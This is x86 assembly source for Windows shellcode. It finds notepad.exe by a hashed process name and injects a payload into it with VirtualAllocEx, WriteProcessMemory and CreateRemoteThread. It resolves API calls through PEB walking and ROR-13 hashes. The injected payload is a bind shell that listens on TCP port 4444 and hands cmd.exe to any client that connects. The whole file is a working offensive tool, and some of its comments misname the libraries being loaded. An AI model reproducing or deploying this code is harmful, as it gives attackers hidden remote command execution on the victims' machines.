[BITS 32]

global _start

_start:

cld  			; Clear Direction Flag; put "cmd" on stack
; Psapi.dll 50 73 61 70 69 2e 64 6c 6c	
	xor eax,eax
	push 0xffff016c
	push 0x6c642e69
	push 0x70617350
	mov [esp+9],AL
	push esp
	push 0xec0e4e8e		; push loadlibraryA hash
	call api_call		; call LoadLibraryA(user32.dll)
	mov edx,eax			; mov pointer to user32.dll to edx
;Create Emnpty array a[1024]
	xor ecx,ecx		
	mov cx,0x400		; save buffer size in ecx
	sub esp,ecx		; create buffer on stack
	mov edi,esp		; edi = addr of buffer
	push edi		; save edi on stack
	xor eax,eax
	rep stosb		; move byte from eax to addr in edi until ecx reach zero
	pop edi			; restore original value of edi
;EnumProcesses(
;  _Out_  DWORD *pProcessIds,
;  _In_   DWORD cb,
;  _Out_  DWORD *pBytesReturned
;)
;0x12E8C9FB		EnumProcesses
; enumerates all process ids
	push edi		; push address to empty buffer for BytesReturned
	push 400		; push buffer size
	add edi,0x04		; inc edi with 4 bytes
	push edi		; push new buffer address for process IDs
	push 0xFBC9E812		; hash for enum processes
	call api_call		; call enumprocesses(&idbuff,0x400,&bytesreturned)
; getting process names:
	mov esi,edi		; make esi point to buffer 
loop:
	mov dword ebx,[esi]	; get first value(processID) into ebx
	test bl,bl		; test if process id = 0 
	jz loop_1		; if zero jump to loop1
;OpenProcess(
;  _In_  DWORD dwDesiredAccess,
;  _In_  BOOL bInheritHandle,
;  _In_  DWORD dwProcessId
;)
;0xC097E2EF             OpenProcess
; opens handle to process
	xor eax,eax
	push ebx		; push process ID
	push eax		; push zero as INherit handle whiche means false
	;mov eax,0x1F0FFF
	push 2035711		; push 0x1F0FFF PROCESS_ALL_ACCESS should be PROCESS_QUERY_INFORMATION
	push 0xEFE297C0		; Push hash for openprocess()
	call api_call		; call openprocess(PROCESS_ALL_ACCESS,FALSE,pid)
	mov ebx,eax
;NtQueryInformationProcess(
; _In_       HANDLE ProcessHandle,
; _In_       PROCESSINFOCLASS ProcessInformationClass,
;  _Out_      PVOID ProcessInformation,
;  _In_       ULONG ProcessInformationLength,
;  _Out_opt_  PULONG ReturnLength
;);0x39D80FB1		NtQueryInformationProcess
; gets information about process
;	xor eax,eax
;	xor ecx,ecx
;	mov ecx,0x400		
;	sub esp,ecx		
;	mov edi,esp		
;	push edi	
;	rep stosb	
;	pop edi
;	push 0x400		; push process information length
;	push edi		; push buffer to save process information
;	push 27			; push 27 processIMagename
;	push ebx		; push process handle
;	push 0xB10FD839		; push hash for NtQueryInformationProcess
;	call api_call		; call NtQueryInformationProcess(hprocess,processImageName,informationsize)
;
;GetProcessImageFileName(
;  _In_   HANDLE hProcess,
;  _Out_  LPTSTR lpImageFileName,
;  _In_   DWORD nSize
;);
;0x7DEC63F7		GetProcessImageFileNameA	
	xor eax,eax
	xor ecx,ecx
	mov ecx,0x100
	sub esp,ecx
	mov edi,esp
	push edi
	rep stosb
	pop edi
	push 0x100			; push buffer nsize
	push edi			; push empty buffer to store filename
	push ebx			; push hprocess
	push 0xF763EC7D			; push hash for GetProcessImageFileName 
	call api_call			; call GetProcessImageFileName(hprocess,imagefilename,nsize)
	xor eax,eax			
	cmp [edi],eax			; if there is no process image name 
	je loop_1			;jump loop_1
; check for last slash / char
; "\" = 5c
	xor eax,eax
	xor edx,edx
	mov edx,0x5c			; edx has value "\"
srch:
	cmp [edi],al			; compare byte to null
	jne srch_2			; if not equal null jump to srch_2
srch_main:
	cmp [edi],dl			; if equal null continue and cmp edi to "\"
	jne srch_3			; if not eqal jmp to srch_3
	jmp srch_end
srch_2:
	inc edi				; inc edi 
	jmp srch			; jmp back to srch
srch_3:
	dec edi				; dec edi since the process name value is the full drive path "\drive0\bla\blablabla\bla.exe" so we search for end of string
	jmp srch_main			; when we find it we go back till we reach the last "\" sign when found go to search end

loop_1:
	add esi,0x04	; inc esi with 4 bytes get next pid
	jmp loop	; jump back to loop 

srch_end:
;0x91DE89D5              notepad.exe	
	push esi	; save esi original value to stack
	xor eax,eax
	mov edx,0xD589DE91		; put notepad.exe hash in edx same as api_call :)
	inc edi				; inc edi so it becomes notepad.exe instead of \notepad.exe
	mov esi,edi			; mov address of processname to esi
	xor edi,edi
loop_procname:	
	lodsb				; load byte from esi to eax and inc esi
	test al,al			; test for end of string
	jz procname_finish		; if end reached jump to procname_finished
	ror edi,0xd			; rotate edi 13 bits to the right
	add edi,eax			; add byte from eax to hash accumulator
	jmp loop_procname		; jmp untill endof string reached
procname_finish:
	cmp edi,edx			; compare if given processname hash equals computed hash
	pop esi				; pop back original value of esi
	jne loop_1			; if not equal jump to loop_1
openproc:

;VirtualAllocEx(
;  _In_      HANDLE hProcess,
;  _In_opt_  LPVOID lpAddress,
;  _In_      SIZE_T dwSize,
;  _In_      DWORD flAllocationType,
;  _In_      DWORD flProtect
;)
;0x9C951A6E              VirtualAllocEx
xor eax,eax
mov esi,0x159			; shellcode size
push byte 0x40			; 0x40 PAGE_READ/WRITE_EXECUTE
push 0x1000			; MEM_COMMIT
push esi			; PUSH SIZE
push eax			; address = NULL
push ebx
push 0x6e1a959c		; virtualallocex()
call api_call

mov edx,eax			; edx = &memory
mov edi,eax			; prepare edi with memory address for rep movsb
mov ecx,esi			; put size in ecx

call payload
save:
pop esi				;save address of payload in memory
;rep movsb			; move bytes from address at esi to addr at edi untill ecx is zero
;WriteProcessMemory(
;  _In_   HANDLE hProcess,
;  _In_   LPVOID lpBaseAddress,
;  _In_   LPCVOID lpBuffer,
;  _In_   SIZE_T nSize,
;  _Out_  SIZE_T *lpNumberOfBytesWritten
;);
;0xA16A3DD8		WriteProcessMemory
	xor eax,eax
	push eax
	push ecx
	push esi
	push edi
	push ebx
	push 0xD83D6AA1
	call api_call

;CreateRemoteThread(HANDLEhProcess,lpthreadatrributes,dwstacksize,lpstartaddress,lpparameter,dwcreateionflag,lpthreadid)
;CreateRemoteThread(notpad.exe PID,*SECURITY_ATTRIBUTES,0,address of accept,0,0,NULL)
;0xDD9CBD72		CreateRemoteThread
    xor eax,eax
    push eax                ; lpthreadid = NULL
    push eax                ; dwcreationflag = 0
    push eax                ; lpparameter = NULL
    push edi                ; lpstartaddress
    push eax                ; dwstacksize
    push eax                ; pointer to SECURITY_ATTRIBUTES STRUCT
    push ebx
;push 0xCA2BD06B         ; push hash of createthread()
    push 0x72BD9CDD			; push createthreadex()
	call api_call           ; call createthread()
	pop eax
	pop eax
	pop eax
	sub esp,44
	jmp exit
payload:
call save
cld
call start
api_call:
	pushad			; saves registers original values
	mov ebp,esp		; make ebp stack frame pointer
	xor edx,edx		; zero out edx
	mov edx,[fs:edx+0x30]	;PEB 
	mov edx,[edx+0x0c]		; PEB->ldr
	mov edx,[edx+0x14]		; PEB->ldr.InMemoryOrderList
next_module:
	mov esi,[edx+0x28]		; esi current dll unicode name
	push edx				; save postion in list
	mov edx,[edx+0x10]		; edx = module base address
	mov eax,[edx+0x3c]		; jump over PE header
	mov eax,[edx + eax +0x78]	; eax = export table rva
	test eax,eax				; test if EAT exist
	jz get_next_mod1			; if EAT doesnt exist get next module
	add eax,edx					; eax = EAT base address
	push eax					; save EAT address on stack
	mov ecx,[eax+0x18]			; ecx = number of functions in module
	mov ebx,[eax+0x20]			; ebx = rva of function names table
	add ebx,edx					; ebx = names table base addr
get_next_func:
	jecxz get_next_mod			; if ecx ( number of functions is zero jump to next module)
	dec ecx						; decrease ecx
	mov esi,[ebx+ecx*4]			; esi = RVA of function names table address + function number * DWORD
	add esi,edx					; eso  = function base addr
	xor edi,edi					; zerou  out edi to hold function hash
	xor eax,eax					; zero out eax 
loop_funcname:
	lodsb						; lod bytes in esi to eax and inc eax
	test al,al					; check last byte if null (EOS)
	jz compute_hash_finished	
	ror edi,0xd					; rotate edi 13 bits to the right
	add edi,eax					; add byte in eax into edi
	jmp loop_funcname
compute_hash_finished:
	cmp edi,[ebp +0x24]			; compare requested hash with computed hash
	jnz get_next_func			; if not the same get next function
	pop eax						; pop current module EAT
	mov ebx,[eax+0x24]			; get ordinals table rva
	add ebx,edx					; ebx = base addr of ordinal table
	mov cx,[ebx+2*ecx]			; ecx = current function ordinal
	mov ebx,[eax+0x1c]			; ebx = address table rva
	add ebx,edx					; ebx =  adress table base address
	mov eax,[ebx+4*ecx]			; eax = function RVA
	add eax,edx					; eax = function address
finish:
	mov [esp+0x20],eax			; put function addre istead of eax when registers are restored
	pop ebx						; pop postion in memory order list
	popad						; restore registers
	pop ecx						; pop current caller return address into ecx
	pop edx						; remove requested function hash from stack
	push ecx					; push caller return addres
	jmp eax						; call function 
get_next_mod:
	pop eax						; restore the current now previous EAT base addr
get_next_mod1:
	pop edx						; pop back opur position in list
	mov edx,[edx]				; get next module in list since it is an flinked list
	jmp short next_module		; get next module
start:
	pop ebp
; get functions in ws2_32.dll
;ws2_32.dll		77 73 32 5f 33 32 2e 64 6c 6c
	xor eax,eax
	push 0xff206c6c		; push ws2_32.dll
	push 0x642e3233		; to stack
	push 0x5f327377
	mov [esp+0xA],al	; replace 10th character with NULL
	push esp			; push stack
	push 0xec0e4e8e		; push loadlibraryA hash
	call ebp		; call LoadLibraryA(user32.dll)
	mov edx,eax			; mov pointer to user32.dll to edx
;WSAStartup(WORD wVersionRequested,struct LPWSADATA lpWSAData)
	xor edx,edx		; zero out edx
	mov dh,0x03		; size of WSADATA is 0x300
	sub esp,edx		; save space on stack for WSADATA
; initialize WSAStartup socket
	xor ecx,ecx
	inc ecx
	inc ecx
	push esp		; use stack for WSADATA
	push ecx		; wversionrequest 2
	push 0x3BFCEDCB		; push WSAStartup hash on stack
	call ebp		; call api_call WSAStartup		
	add esp,0x0300		; return stack to original position after WSADATA
;WSASocket(int af,itn type,int protocol, lpprotocolinfo,group g,DWORD dwflags)
;WSASocket(2,1,0,0,0,0)
	xor eax,eax		; zero out eax
	push eax		; dwflags = 0
	push eax		; g = 0
	push eax		; lpprotocolinfo = NULL
	push eax		; protocol = 0
	inc eax			; eax = 1
	push eax		; type = 1 = SOCK_STREAM
	inc eax			; eax = 2
	push eax		; af = 2 = AF_INET
	push 0xADF509D9	; push WSASocketA hash
	call ebp		; call WSASocket
	mov esi,eax		; save socket file discriptor in esi
;bind(socket s, sockaddr_in *name,namelen)
;sockaddr_in{short sin_family,sin_port,in_addr sin-addr,sin_zero}
;sockaddr_in{AF_INET,htons(4444),0,0}
;bind(esi,&sockaddr_in,0,sizeof(sockaddr_in))
	xor eax,eax
;struct sockaddr_in begin
	push eax		; sin_zero = 0
	push eax		;
	push eax		; sin_addr = NULL
	mov eax,0x5c110102	; eax = htons(4444)0102
	dec ah 			; eax  = htons(4444)0002
	push eax		; *sockaddr_in on stack
	mov eax,esp		; eax has pointer to struct sockaddr_in
;struct sockadd_in end
	xor ebx,ebx		; zero out ebx
	mov bl,0x10		; set low order byte of ebx to 10 size of struct
	push ebx		; namelen = ebx = 10
	push eax		; *name = pointer located at eax (pointer to struct)
	push esi		; s  = socket file descriptor at esi returned by WSASocketA
	push 0xC7701AA4	; push bind() function hash
	call ebp		; call bind
;listen(socket s, backlog)
;listen(esi, ebx(0x10))
	push ebx		; backlog = 0x10
	push esi		; s  = esi
	push 0xE92EADA4	; push listen() function
	call ebp		; call listen()
;accept(socket s, sockaddr *addr, *addrlen_
;accept(esi,output *struct(ecx),pointer to length)
	push ebx		; addr len ebx = 0x10 
	mov edx,esp		; save pointer to addrlen in edx ; edx = &ebx
	sub esp,ebx		; save 16 bytes on stack for ouput struct addr to the accept
	mov ecx,esp		; ecx now hold the *to the addr output struct 
	push edx		; *addrlen = edx
	push ecx		; *output struct
	push esi		; socket file descriptor
	push 0x498649E5	; push accept() function hash
	;INT3
	call ebp		; call accept()
	;INT3
	mov esi,eax		; save the client file descriptor in esi
; put "cmd" on stack
	mov eax,0x646d6301	; mov "cmd01" to eax
	sar eax,0x08		; shift right 8 bits to get NULL at end of cmd
	push eax		; push cmd on stack
	mov ebx,esp	; save pointer to cmd in ebp+0x20
;CreateProcess(lpapplicationname,lpcommandline,lpprocessattributes,lpthreadattributes,binherithandles,dwcreateionflags,lpcurrentdirectory,struct lpstartupinfo, struct lp process information)
;struct STARTUPINFO{cb,lpreserved,lpdesktop,lptitle,dwx,dwy,dwxsize,dwysize,dwxcountchars,dwycountchars,dwfillattribute,dwflages,wshowwindow,cbreserved2,lpreserved2,hstdInput,hStdOutput,hStdError}
;struct PROCESSINFORMATION{hProcess,hThread,dwProcessId,dwThreadId}
;structs initalization
	xor ecx,ecx		; zero out ecx
	mov cl,0x54		; set the low order of bytes to 0x54 which is going to represent the size of STARTUPINFO and PROCESSINFO on stack 
	sub esp,ecx		; allocate space for structs on stack
	mov edi,esp		; set edi to point to STARTUPINFO struct
	push edi		; save edi on stack
	xor eax,eax		; zero out eax for use with stosb to zeroout the 2 structs
	rep stosb		; repeat moving eax byte by byte starting by addr pointed to by edi until ecx = 0x54 is zero
	pop edi			; restore original value of edi pointer to STARTUPINFO Struct
;struct STARTUPINFO begin
	mov BYTE  [edi],0x44	; sets the cb attribute to 0x44 the size of the structure
	inc BYTE  [edi+0x2d]	; set dwflags STARTF_USESTDHANDLES flag to indicate that the hStdInput,hStdOutput,hStdError attributes should be used
	push edi 		; save edi on stack
	mov eax,esi		; set eax to the client file descriptor
	lea edi, [edi+0x38]	; load the addr of hStdInput attribute
	stosd			; store dwrod at eax to addr pointed to by edi hStdinput  eax  = client file descriptor and increment edi 
	stosd 			; store dword at eax to addr pointed to by edi hStdOutput 
	stosd			; store dword at eax to addr pointed to by edi hStdError
	pop edi			; restore edi to original value which is pointer to STARTUPINFO struct
;struct STARTUPINFO end
	lea esi,[edi+0x44]	; load the effective address of struct PROCESS INFORMATION to esi we got that because the cb attribute in the startupinformation attribute show the size of the struct
;createprocess
	xor eax,eax		; zero out eax 
	push esi		; push the pointer to the PROCESSINFORMATION struct to lpProcessInformation attribute
	push edi		; push the pointer to the STARTUPINFORMATION struct to lpStartupinfo attribute  
	push eax		; set lpstartupdirectory to NULL
	push eax		; set the lpEnviroment to NULL
	;push 0x08000000		; set the dwcreationflag to CREATE_NO_WINDOW
	push eax		; set the dwcreationflag to 0
	inc eax			; eax = 1
	push eax		; set bInheritHandles argument to TRUE since client need to inherit the socket file descriptor
	dec eax			; eax = 0
	push eax		; set lpthreadAttributes argument as NULL
	push eax 		; set lpProcessAttributes argument as NULL
	push ebx		; set the lpcommandline argument to cmd saved at [ebp+0x2c]
	push eax		; set lpApplicationName argument to NULL
	push 0x16B3FE72	; push createprocessfunction()
	call ebp		; call createprocess
;exitprocess	0x7ED8E273
;	push 0x73E2D87E
;	call ebp
;0xE4CFCDE8              GetCurrentThread
push 0xE8CDCFE4		; GetCuurentThread() hash	
call ebp		; call it current thread handle is in eax
;0x896F01BD              TerminateThread
xor ecx,ecx		; zero out ecx
push ecx		; dw milliseconds = 0
push eax		; push current thread handle
push 0xBD016F89		; push TerminateThread() hash
call ebp		; call TerminateThread(handle,dwmilliseconds)
nop
nop
exit:
;exitprocess    0x7ED8E273
       push 0x73E2D87E
       call api_call
